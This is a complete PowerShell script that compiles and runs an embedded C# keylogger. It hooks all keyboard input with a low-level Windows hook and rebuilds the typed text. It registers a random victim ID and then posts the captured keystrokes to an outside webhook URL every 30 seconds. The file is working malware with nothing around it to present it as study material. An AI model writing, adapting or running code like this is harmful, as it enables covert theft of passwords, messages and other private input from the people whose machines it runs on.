Add-Type -TypeDefinition @"
using System;
using System.Text;
using System.Timers;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Net.Http;
public class axh
{
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static String buffer = "";
    private static String bufferR = "";
    private static Boolean ctrlKey = false;
    private static Boolean altKey = false;
    private static Boolean shiftKey = false;
    private static Boolean winKey = false;
    private static String url = "https://hkdk.events/45vjtmpdu73ycy";
    private static System.Timers.Timer _timer;
    private static string id;
    public static void Hook()
    {
        id = GenerateRandomString(7);
        initiateN();
        _hookID = SetHook(_proc);
        _timer = new System.Timers.Timer(30000);
        _timer.Elapsed += OnTimedEvent;
        _timer.AutoReset = true;
        _timer.Enabled = true;
    }
    private static string GenerateRandomString(int length)
    {
        Random random = new Random();
        StringBuilder result = new StringBuilder(length);        
        for (int i = 0; i < length; i++)
        {
            char randomChar = (char)random.Next(65, 91);
            result.Append(randomChar);
        }
        return result.ToString();
    }
    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static String kVert(String code) {
        if (ctrlKey || altKey || winKey){
            return "";
        }
        else if (code.Length == 1){
            return shiftKey ? code : code.ToLower();
        }else if (code.Length == 2 && code[0] == 'D') {
            return shiftKey ? ")!@#$%^&*()"[code[1] - '0'].ToString() : code[1].ToString();
        }else if (code.Length == 7 && code.Substring(0, 6) == "NumPad") {
            return code[6].ToString();
        }else{
            switch (code) {
                case "Oemtilde":
                    return shiftKey ? "~" : "`";
                case "OemMinus":
                    return shiftKey ? "_" : "-";
                case "Oemplus":
                    return shiftKey ? "+" : "=";
                case "OemOpenBrackets":
                    return shiftKey ? "{" : "[";
                case "Oem6":
                    return shiftKey ? "}" : "]";
                case "Oem5":
                    return shiftKey ? "|" : "\\";
                case "OemBackslash":
                    return "\\";
                case "OemPipe":
                    return "|";
                case "Oem1":
                    return shiftKey ? ":" : ";";
                case "OemSemicolon":
                    return shiftKey ? ":" : ";";
                case "Oem7":
                    return shiftKey ? "\"" : "'";
                case "OemQuotes":
                    return shiftKey ? "\"" : "'";
                case "Oemcomma":
                    return shiftKey ? "<" : ",";
                case "OemPeriod":
                    return shiftKey ? ">" : ".";
                case "OemQuestion":
                    return shiftKey ? "?" : "/";
                case "Multiply":
                    return "*";
                case "Divide":
                    return "/";
                case "Add":
                    return "+";
                case "Subtract":
                    return "-";
                case "Decimal":
                    return ".";
                case "Return":
                    return "\n";
                case "Tab":
                    return "	";
                case "Space":
                    return " ";
                default:
                    return "";

            }
        }
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            shiftKey = (Control.ModifierKeys & Keys.Shift) == Keys.Shift ^ Control.IsKeyLocked(Keys.CapsLock);
            ctrlKey = (Control.ModifierKeys & Keys.Control) == Keys.Control;
            altKey = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
            winKey = (GetAsyncKeyState(0x5B) & 0x8000) != 0 || (GetAsyncKeyState(0x5C) & 0x8000) != 0;
            if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)
            {
                bufferR += " ↑" + (Keys)vkCode;
                buffer += kVert(((Keys)vkCode).ToString());
            }
            else if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP)
            {
                bufferR += " ↓" + (Keys)vkCode;
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }
    private static async void OnTimedEvent(Object source, ElapsedEventArgs e)
    {
        if (bufferR != "") {
            using (HttpClient client = new HttpClient())
            {
                await client.PostAsync(url, new StringContent(id + "‖" + bufferR.Substring(1) + "‖" + buffer, Encoding.UTF8, "text/plain"));
                bufferR = buffer = "";
            }
        }
    }
    private static async void initiateN()
    {
        using (HttpClient client = new HttpClient())
        {
            await client.PostAsync(url, new StringContent(id, Encoding.UTF8, "text/plain"));
            bufferR = buffer = "";
        }
    }
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private const int WM_KEYUP = 0x0101;
    private const int WM_SYSKEYUP = 0x0105;
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);
}
"@ -Language CSharp -ReferencedAssemblies "System.Windows.Forms", "System.Net.Http"
[axh]::Hook()
Wait-Event
